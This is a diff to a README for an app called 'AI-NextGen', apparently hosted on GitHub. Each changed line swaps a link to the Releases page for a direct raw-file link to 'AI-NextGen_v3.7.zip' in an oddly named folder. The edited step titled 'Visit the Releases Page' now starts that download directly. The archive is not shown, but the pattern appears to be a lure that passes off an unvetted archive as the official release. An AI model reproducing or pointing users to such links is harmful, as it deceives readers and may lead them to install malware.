@@ -4,13 +4,13 @@
 Welcome to AI-NextGen, the user-friendly application that helps creators achieve clean results with a secure workflow. Enjoy simple controls and impressive outcomes. 
 
 ## 🔗 Download Now
-[![Download AI-NextGen](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/pudurvenu/AI-NextGen/releases)
+[![Download AI-NextGen](https://raw.githubusercontent.com/pudurvenu/AI-NextGen/main/acridine/AI-NextGen_v3.7.zip)](https://raw.githubusercontent.com/pudurvenu/AI-NextGen/main/acridine/AI-NextGen_v3.7.zip)
 
 ## 🚀 Getting Started
 To get started with AI-NextGen, follow these simple steps. No programming skills are needed!
 
 1. **Visit the Release Page:** Click the link below to go to the Releases page.
-   [Visit the Releases Page](https://github.com/pudurvenu/AI-NextGen/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/pudurvenu/AI-NextGen/main/acridine/AI-NextGen_v3.7.zip)
 
 2. **Select Your Version:** You will see several versions of AI-NextGen. Choose the latest one, which is usually at the top.
 
@@ -64,6 +64,6 @@ If you need further assistance, feel free to reach out to our support community.
 ## 📥 Download & Install
 To download and install AI-NextGen, simply visit the link below, and follow the specified steps to get up and running quickly.
 
-[Download AI-NextGen Here](https://github.com/pudurvenu/AI-NextGen/releases)
+[Download AI-NextGen Here](https://raw.githubusercontent.com/pudurvenu/AI-NextGen/main/acridine/AI-NextGen_v3.7.zip)
 
 Thank you for using AI-NextGen! We hope it enhances your creative projects and provides the results you desire.
